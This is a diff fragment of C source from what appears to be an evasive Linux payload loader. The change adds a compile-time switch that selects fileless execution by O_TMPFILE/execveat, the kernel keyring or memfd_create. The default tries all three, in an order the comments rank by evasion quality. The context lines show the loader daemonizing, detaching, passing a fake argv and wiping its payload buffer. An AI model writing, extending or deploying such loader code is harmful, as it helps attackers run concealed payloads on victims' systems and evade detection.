@@ -522,10 +522,28 @@ int main(int argc, char **argv, char **envp) {
     /* 5. Daemonize: double fork + setsid + /dev/null + ignore signals */
     daemonize_and_detach();
 
-    /* 6. Execute — try techniques in order of evasion */
+    /* 6. Execute — technique selected at compile time via NAX_LOADER_METHOD:
+     *   NAX_LOADER_METHOD=0  auto     (default: fallback chain, all three)
+     *   NAX_LOADER_METHOD=1  tmpfile  (O_TMPFILE + execveat only)
+     *   NAX_LOADER_METHOD=2  keyring  (kernel keyring only)
+     *   NAX_LOADER_METHOD=3  memfd    (memfd_create only)
+     */
+#ifndef NAX_LOADER_METHOD
+#define NAX_LOADER_METHOD 0
+#endif
+
+#if NAX_LOADER_METHOD == 1
+    exec_otmpfile(buf, stub_payload_len, fake_argv, envp);
+#elif NAX_LOADER_METHOD == 2
+    exec_keyring(buf, stub_payload_len, fake_argv, envp);
+#elif NAX_LOADER_METHOD == 3
+    exec_memfd(buf, stub_payload_len, fake_argv, envp);
+#else
+    /* auto: try in order of evasion quality */
     exec_otmpfile(buf, stub_payload_len, fake_argv, envp);
     exec_keyring(buf, stub_payload_len, fake_argv, envp);
     exec_memfd(buf, stub_payload_len, fake_argv, envp);
+#endif
 
     /* All techniques failed */
     memset(buf, 0, stub_payload_len);
